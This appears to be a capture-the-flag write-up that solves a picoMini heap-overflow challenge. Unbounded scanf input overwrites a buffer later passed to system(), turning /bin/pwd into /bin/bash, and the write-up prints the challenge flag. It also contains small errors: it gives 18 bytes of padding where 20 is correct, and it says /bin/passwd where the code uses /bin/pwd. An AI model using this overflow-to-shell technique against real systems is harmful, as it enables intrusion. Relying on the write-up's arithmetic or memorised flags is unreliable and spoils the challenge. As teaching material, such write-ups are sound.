Hello , And welcome to this writup , We are going to solve Input injection 2 from binary exploitation category in picoMini africa by CTMU ,Without futher ado let`s dive in .


**You are given the following program :
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int main(void) {
	char* username = malloc(28);
	char* shell = malloc(28);
	
	printf("username at %p\n", username);
    fflush(stdout);
	printf("shell at %p\n", shell);
    fflush(stdout);
	
	strcpy(shell, "/bin/pwd");
	
	printf("Enter username: ");
    fflush(stdout);
	scanf("%s", username);
	
	printf("Hello, %s. Your shell is %s.\n", username, shell);
	system(shell);
    fflush(stdout);
	
	return 0;
}
```
# Key insights :
1.it allocates 28 bytes on the heap using malloc (two times).

So now , username and shell pointers ,point at the base adress of the allocated buffers .

2.It prints the base adress of each buffer with this line :
```
printf("username at %p\n", username);
printf("shell at %p\n", shell);
```
This is used to help you determine which buffer is above the other (It is not necessary , we can determine that manually using gdb) .

3.It uses the vulnerable strcpy (no length checks , thus vulnerable to buffer overflows) ,to copy "/bin/pwd" to the shell buffer (which is obviuosly a linux command ).

4.It requests input from user using vulnerable ```scanf```, finally it prints a greeting and calls ```system``` on /bin/passwd 


## What we can do :
By observing the base adresses of the buffers , we notice that buffer ```username``` is in a lower adress than shell buffer .

So we might try to overflow username , to potentialy insert whatever command we want in shell buffer .

If you subtracted the base adresses from each other you will get :```0x30```

Which is as follows :
```
28 bytes for username buffer ,then 18 bytes seperating the buffers 
```

So , based on  that we craft the input using this python3 script :
```
'A'*48 +"/bin/bash"
```

Finally , run the program and put the resulting string , and you will get :
```
username at 0x20abe2a0
shell at 0x20abe2d0
Enter username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/bash
pwd
/home/ctf-player
ls -la
total 16
drwxr-xr-x 1 ctf-player ctf-player   22 Sep 26 20:27 .
drwxr-xr-x 1 root       root         24 Sep 26 20:27 ..
-rw-r--r-- 1 ctf-player ctf-player  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 ctf-player ctf-player 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 ctf-player ctf-player  807 Feb 25  2020 .profile
-r-------- 1 ctf-player ctf-player   34 Sep 26 20:27 flag.txt
cat flag.txt
picoCTF{us3rn4m3_2_sh3ll_466d4bae} 
```

**And thats it , hope you enjoyed**